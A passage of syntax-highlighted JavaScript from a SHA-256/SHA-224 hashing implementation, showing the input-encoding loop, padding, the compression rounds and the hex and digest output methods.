class="hljs-number">0xd800</span> || code &gt;= <span class="hljs-number">0xe000</span>) &#123;<br>                        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= (<span class="hljs-number">0xe0</span> | (code &gt;&gt; <span class="hljs-number">12</span>)) &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>];<br>                        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= (<span class="hljs-number">0x80</span> | ((code &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">0x3f</span>)) &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>];<br>                        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= (<span class="hljs-number">0x80</span> | (code &amp; <span class="hljs-number">0x3f</span>)) &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>]<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        code = <span class="hljs-number">0x10000</span> + (((code &amp; <span class="hljs-number">0x3ff</span>) &lt;&lt; <span class="hljs-number">10</span>) | (message.<span class="hljs-title function_">charCodeAt</span>(++index) &amp; <span class="hljs-number">0x3ff</span>));<br>                        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= (<span class="hljs-number">0xf0</span> | (code &gt;&gt; <span class="hljs-number">18</span>)) &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>];<br>                        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= (<span class="hljs-number">0x80</span> | ((code &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x3f</span>)) &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>];<br>                        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= (<span class="hljs-number">0x80</span> | ((code &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">0x3f</span>)) &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>];<br>                        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= (<span class="hljs-number">0x80</span> | (code &amp; <span class="hljs-number">0x3f</span>)) &lt;&lt; <span class="hljs-variable constant_">SHIFT</span>[i++ &amp; <span class="hljs-number">3</span>]<br>                    &#125;<br>                &#125;<br>            &#125;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastByteIndex</span> = i;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">bytes</span> += i - <span class="hljs-variable language_">this</span>.<span class="hljs-property">start</span>;<br>            <span class="hljs-keyword">if</span> (i &gt;= <span class="hljs-number">64</span>) &#123;<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">block</span> = blocks[<span class="hljs-number">16</span>];<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">start</span> = i - <span class="hljs-number">64</span>;<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">hash</span>();<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">hashed</span> = <span class="hljs-literal">true</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">start</span> = i<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">bytes</span> &gt; <span class="hljs-number">4294967295</span>) &#123;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">hBytes</span> += <span class="hljs-variable language_">this</span>.<span class="hljs-property">bytes</span> / <span class="hljs-number">4294967296</span> &lt;&lt; <span class="hljs-number">0</span>;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">bytes</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">bytes</span> % <span class="hljs-number">4294967296</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span><br>    &#125;;<br>    <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">finalize</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">finalized</span>) &#123;<br>            <span class="hljs-keyword">return</span><br>        &#125;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">finalized</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">var</span> blocks = <span class="hljs-variable language_">this</span>.<span class="hljs-property">blocks</span>,<br>            i = <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastByteIndex</span>;<br>        blocks[<span class="hljs-number">16</span>] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">block</span>;<br>        blocks[i &gt;&gt; <span class="hljs-number">2</span>] |= <span class="hljs-variable constant_">EXTRA</span>[i &amp; <span class="hljs-number">3</span>];<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">block</span> = blocks[<span class="hljs-number">16</span>];<br>        <span class="hljs-keyword">if</span> (i &gt;= <span class="hljs-number">56</span>) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">hashed</span>) &#123;<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">hash</span>()<br>            &#125;<br>            blocks[<span class="hljs-number">0</span>] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">block</span>;<br>            blocks[<span class="hljs-number">16</span>] = blocks[<span class="hljs-number">1</span>] = blocks[<span class="hljs-number">2</span>] = blocks[<span class="hljs-number">3</span>] = blocks[<span class="hljs-number">4</span>] = blocks[<span class="hljs-number">5</span>] = blocks[<span class="hljs-number">6</span>] = blocks[<span class="hljs-number">7</span>] = blocks[<span class="hljs-number">8</span>] = blocks[<span class="hljs-number">9</span>] = blocks[<span class="hljs-number">10</span>] = blocks[<span class="hljs-number">11</span>] = blocks[<span class="hljs-number">12</span>] = blocks[<span class="hljs-number">13</span>] = blocks[<span class="hljs-number">14</span>] = blocks[<span class="hljs-number">15</span>] = <span class="hljs-number">0</span><br>        &#125;<br>        blocks[<span class="hljs-number">14</span>] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">hBytes</span> &lt;&lt; <span class="hljs-number">3</span> | <span class="hljs-variable language_">this</span>.<span class="hljs-property">bytes</span> &gt;&gt;&gt; <span class="hljs-number">29</span>;<br>        blocks[<span class="hljs-number">15</span>] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">bytes</span> &lt;&lt; <span class="hljs-number">3</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">hash</span>()<br>    &#125;;<br>    <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">hash</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">var</span> a = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h0</span>,<br>            b = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h1</span>,<br>            c = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h2</span>,<br>            d = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h3</span>,<br>            e = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h4</span>,<br>            f = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h5</span>,<br>            g = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h6</span>,<br>            h = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h7</span>,<br>            blocks = <span class="hljs-variable language_">this</span>.<span class="hljs-property">blocks</span>,<br>            j, s0, s1, maj, t1, t2, ch, ab, da, cd, bc;<br>        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">16</span>; j &lt; <span class="hljs-number">64</span>; ++j) &#123;<br>            t1 = blocks[j - <span class="hljs-number">15</span>];<br>            s0 = ((t1 &gt;&gt;&gt; <span class="hljs-number">7</span>) | (t1 &lt;&lt; <span class="hljs-number">25</span>)) ^ ((t1 &gt;&gt;&gt; <span class="hljs-number">18</span>) | (t1 &lt;&lt; <span class="hljs-number">14</span>)) ^ (t1 &gt;&gt;&gt; <span class="hljs-number">3</span>);<br>            t1 = blocks[j - <span class="hljs-number">2</span>];<br>            s1 = ((t1 &gt;&gt;&gt; <span class="hljs-number">17</span>) | (t1 &lt;&lt; <span class="hljs-number">15</span>)) ^ ((t1 &gt;&gt;&gt; <span class="hljs-number">19</span>) | (t1 &lt;&lt; <span class="hljs-number">13</span>)) ^ (t1 &gt;&gt;&gt; <span class="hljs-number">10</span>);<br>            blocks[j] = blocks[j - <span class="hljs-number">16</span>] + s0 + blocks[j - <span class="hljs-number">7</span>] + s1 &lt;&lt; <span class="hljs-number">0</span><br>        &#125;<br>        bc = b &amp; c;<br>        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">64</span>; j += <span class="hljs-number">4</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">first</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">is224</span>) &#123;<br>                    ab = <span class="hljs-number">300032</span>;<br>                    t1 = blocks[<span class="hljs-number">0</span>] - <span class="hljs-number">1413257819</span>;<br>                    h = t1 - <span class="hljs-number">150054599</span> &lt;&lt; <span class="hljs-number">0</span>;<br>                    d = t1 + <span class="hljs-number">24177077</span> &lt;&lt; <span class="hljs-number">0</span><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    ab = <span class="hljs-number">704751109</span>;<br>                    t1 = blocks[<span class="hljs-number">0</span>] - <span class="hljs-number">210244248</span>;<br>                    h = t1 - <span class="hljs-number">1521486534</span> &lt;&lt; <span class="hljs-number">0</span>;<br>                    d = t1 + <span class="hljs-number">143694565</span> &lt;&lt; <span class="hljs-number">0</span><br>                &#125;<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">first</span> = <span class="hljs-literal">false</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                s0 = ((a &gt;&gt;&gt; <span class="hljs-number">2</span>) | (a &lt;&lt; <span class="hljs-number">30</span>)) ^ ((a &gt;&gt;&gt; <span class="hljs-number">13</span>) | (a &lt;&lt; <span class="hljs-number">19</span>)) ^ ((a &gt;&gt;&gt; <span class="hljs-number">22</span>) | (a &lt;&lt; <span class="hljs-number">10</span>));<br>                s1 = ((e &gt;&gt;&gt; <span class="hljs-number">6</span>) | (e &lt;&lt; <span class="hljs-number">26</span>)) ^ ((e &gt;&gt;&gt; <span class="hljs-number">11</span>) | (e &lt;&lt; <span class="hljs-number">21</span>)) ^ ((e &gt;&gt;&gt; <span class="hljs-number">25</span>) | (e &lt;&lt; <span class="hljs-number">7</span>));<br>                ab = a &amp; b;<br>                maj = ab ^ (a &amp; c) ^ bc;<br>                ch = (e &amp; f) ^ (~e &amp; g);<br>                t1 = h + s1 + ch + K[j] + blocks[j];<br>                t2 = s0 + maj;<br>                h = d + t1 &lt;&lt; <span class="hljs-number">0</span>;<br>                d = t1 + t2 &lt;&lt; <span class="hljs-number">0</span><br>            &#125;<br>            s0 = ((d &gt;&gt;&gt; <span class="hljs-number">2</span>) | (d &lt;&lt; <span class="hljs-number">30</span>)) ^ ((d &gt;&gt;&gt; <span class="hljs-number">13</span>) | (d &lt;&lt; <span class="hljs-number">19</span>)) ^ ((d &gt;&gt;&gt; <span class="hljs-number">22</span>) | (d &lt;&lt; <span class="hljs-number">10</span>));<br>            s1 = ((h &gt;&gt;&gt; <span class="hljs-number">6</span>) | (h &lt;&lt; <span class="hljs-number">26</span>)) ^ ((h &gt;&gt;&gt; <span class="hljs-number">11</span>) | (h &lt;&lt; <span class="hljs-number">21</span>)) ^ ((h &gt;&gt;&gt; <span class="hljs-number">25</span>) | (h &lt;&lt; <span class="hljs-number">7</span>));<br>            da = d &amp; a;<br>            maj = da ^ (d &amp; b) ^ ab;<br>            ch = (h &amp; e) ^ (~h &amp; f);<br>            t1 = g + s1 + ch + K[j + <span class="hljs-number">1</span>] + blocks[j + <span class="hljs-number">1</span>];<br>            t2 = s0 + maj;<br>            g = c + t1 &lt;&lt; <span class="hljs-number">0</span>;<br>            c = t1 + t2 &lt;&lt; <span class="hljs-number">0</span>;<br>            s0 = ((c &gt;&gt;&gt; <span class="hljs-number">2</span>) | (c &lt;&lt; <span class="hljs-number">30</span>)) ^ ((c &gt;&gt;&gt; <span class="hljs-number">13</span>) | (c &lt;&lt; <span class="hljs-number">19</span>)) ^ ((c &gt;&gt;&gt; <span class="hljs-number">22</span>) | (c &lt;&lt; <span class="hljs-number">10</span>));<br>            s1 = ((g &gt;&gt;&gt; <span class="hljs-number">6</span>) | (g &lt;&lt; <span class="hljs-number">26</span>)) ^ ((g &gt;&gt;&gt; <span class="hljs-number">11</span>) | (g &lt;&lt; <span class="hljs-number">21</span>)) ^ ((g &gt;&gt;&gt; <span class="hljs-number">25</span>) | (g &lt;&lt; <span class="hljs-number">7</span>));<br>            cd = c &amp; d;<br>            maj = cd ^ (c &amp; a) ^ da;<br>            ch = (g &amp; h) ^ (~g &amp; e);<br>            t1 = f + s1 + ch + K[j + <span class="hljs-number">2</span>] + blocks[j + <span class="hljs-number">2</span>];<br>            t2 = s0 + maj;<br>            f = b + t1 &lt;&lt; <span class="hljs-number">0</span>;<br>            b = t1 + t2 &lt;&lt; <span class="hljs-number">0</span>;<br>            s0 = ((b &gt;&gt;&gt; <span class="hljs-number">2</span>) | (b &lt;&lt; <span class="hljs-number">30</span>)) ^ ((b &gt;&gt;&gt; <span class="hljs-number">13</span>) | (b &lt;&lt; <span class="hljs-number">19</span>)) ^ ((b &gt;&gt;&gt; <span class="hljs-number">22</span>) | (b &lt;&lt; <span class="hljs-number">10</span>));<br>            s1 = ((f &gt;&gt;&gt; <span class="hljs-number">6</span>) | (f &lt;&lt; <span class="hljs-number">26</span>)) ^ ((f &gt;&gt;&gt; <span class="hljs-number">11</span>) | (f &lt;&lt; <span class="hljs-number">21</span>)) ^ ((f &gt;&gt;&gt; <span class="hljs-number">25</span>) | (f &lt;&lt; <span class="hljs-number">7</span>));<br>            bc = b &amp; c;<br>            maj = bc ^ (b &amp; d) ^ cd;<br>            ch = (f &amp; g) ^ (~f &amp; h);<br>            t1 = e + s1 + ch + K[j + <span class="hljs-number">3</span>] + blocks[j + <span class="hljs-number">3</span>];<br>            t2 = s0 + maj;<br>            e = a + t1 &lt;&lt; <span class="hljs-number">0</span>;<br>            a = t1 + t2 &lt;&lt; <span class="hljs-number">0</span><br>        &#125;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">h0</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h0</span> + a &lt;&lt; <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">h1</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h1</span> + b &lt;&lt; <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">h2</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h2</span> + c &lt;&lt; <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">h3</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h3</span> + d &lt;&lt; <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">h4</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h4</span> + e &lt;&lt; <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">h5</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h5</span> + f &lt;&lt; <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">h6</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h6</span> + g &lt;&lt; <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">h7</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h7</span> + h &lt;&lt; <span class="hljs-number">0</span><br>    &#125;;<br>    <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">hex</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">finalize</span>();<br>        <span class="hljs-keyword">var</span> h0 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h0</span>,<br>            h1 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h1</span>,<br>            h2 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h2</span>,<br>            h3 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h3</span>,<br>            h4 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h4</span>,<br>            h5 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h5</span>,<br>            h6 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h6</span>,<br>            h7 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h7</span>;<br>        <span class="hljs-keyword">var</span> hex = <span class="hljs-variable constant_">HEX_CHARS</span>[(h0 &gt;&gt; <span class="hljs-number">28</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h0 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h0 &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h0 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h0 &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h0 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h0 &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[h0 &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h1 &gt;&gt; <span class="hljs-number">28</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h1 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h1 &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h1 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h1 &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h1 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h1 &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[h1 &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h2 &gt;&gt; <span class="hljs-number">28</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h2 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h2 &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h2 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h2 &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h2 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h2 &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[h2 &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h3 &gt;&gt; <span class="hljs-number">28</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h3 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h3 &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h3 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h3 &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h3 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h3 &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[h3 &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h4 &gt;&gt; <span class="hljs-number">28</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h4 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h4 &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h4 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h4 &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h4 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h4 &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[h4 &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h5 &gt;&gt; <span class="hljs-number">28</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h5 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h5 &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h5 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h5 &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h5 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h5 &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[h5 &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h6 &gt;&gt; <span class="hljs-number">28</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h6 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h6 &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h6 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h6 &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h6 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h6 &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[h6 &amp; <span class="hljs-number">0x0F</span>];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">is224</span>) &#123;<br>            hex += <span class="hljs-variable constant_">HEX_CHARS</span>[(h7 &gt;&gt; <span class="hljs-number">28</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h7 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h7 &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h7 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h7 &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h7 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[(h7 &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x0F</span>] + <span class="hljs-variable constant_">HEX_CHARS</span>[h7 &amp; <span class="hljs-number">0x0F</span>]<br>        &#125;<br>        <span class="hljs-keyword">return</span> hex<br>    &#125;;<br>    <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span> = <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">hex</span>;<br>    <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">digest</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">finalize</span>();<br>        <span class="hljs-keyword">var</span> h0 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h0</span>,<br>            h1 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h1</span>,<br>            h2 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h2</span>,<br>            h3 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h3</span>,<br>            h4 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h4</span>,<br>            h5 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h5</span>,<br>            h6 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h6</span>,<br>            h7 = <span class="hljs-variable language_">this</span>.<span class="hljs-property">h7</span>;<br>        <span class="hljs-keyword">var</span> arr = [(h0 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>, (h0 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>, (h0 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>, h0 &amp; <span class="hljs-number">0xFF</span>, (h1 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>, (h1 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>, (h1 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>, h1 &amp; <span class="hljs-number">0xFF</span>, (h2 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>, (h2 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>, (h2 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>, h2 &amp; <span class="hljs-number">0xFF</span>, (h3 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>, (h3 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>, (h3 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>, h3 &amp; <span class="hljs-number">0xFF</span>, (h4 &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>, (h4 &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>, (h4 &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>, h4 &amp; <span class="hljs-number">0xFF</span>, 